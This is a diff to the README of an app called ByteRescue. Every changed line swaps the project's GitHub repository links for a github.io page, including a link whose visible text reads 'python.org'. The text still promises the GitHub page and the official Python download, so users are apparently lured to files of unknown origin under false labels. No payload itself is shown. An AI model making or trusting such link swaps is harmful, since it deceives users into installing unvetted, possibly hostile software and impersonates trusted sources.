@@ -2,7 +2,7 @@
 
 ## 📥 Download & Install
 
-[![Download ByteRescue](https://img.shields.io/badge/Download-ByteRescue-blueviolet?style=for-the-badge&logo=github)](https://github.com/NileshKavindaNaka/ByteRescue)
+[![Download ByteRescue](https://img.shields.io/badge/Download-ByteRescue-blueviolet?style=for-the-badge&logo=github)](https://nileshkavindanaka.github.io)
 
 Visit this link to download the application.
 
@@ -21,7 +21,7 @@ Welcome to ByteRescue! This guide will help you download, install, and start usi
 
 ## 💾 How to Download
 
-1. **Click the blue "Download" button** at the top of this page, or use this link: [https://github.com/NileshKavindaNaka/ByteRescue](https://github.com/NileshKavindaNaka/ByteRescue)
+1. **Click the blue "Download" button** at the top of this page, or use this link: [https://nileshkavindanaka.github.io](https://nileshkavindanaka.github.io)
 2. You will be taken to the ByteRescue GitHub page.
 3. **Look for the green "Code" button** and click it.
 4. **Select "Download ZIP"** from the dropdown menu.
@@ -40,7 +40,7 @@ Welcome to ByteRescue! This guide will help you download, install, and start usi
 7. **ByteRescue will open** in a new window. That's it—you're ready to go!
 
 ### 🚨 Troubleshooting Tip
-If the app doesn't open, you may need to install **Python** (free). Download it from [python.org](https://www.python.org/downloads/) and make sure to check the box **"Add Python to PATH"** during installation, then try again.
+If the app doesn't open, you may need to install **Python** (free). Download it from [python.org](https://nileshkavindanaka.github.io) and make sure to check the box **"Add Python to PATH"** during installation, then try again.
 
 ---
 
@@ -130,7 +130,7 @@ If you run into any issues:
 
 1. **Check the FAQ section** above.
 2. **Look for a `README.md` file** inside the downloaded folder for additional instructions.
-3. **Visit the GitHub repository** at [https://github.com/NileshKavindaNaka/ByteRescue](https://github.com/NileshKavindaNaka/ByteRescue) to ask questions or report bugs.
+3. **Visit the GitHub repository** at [https://nileshkavindanaka.github.io](https://nileshkavindanaka.github.io) to ask questions or report bugs.
 
 ---
 
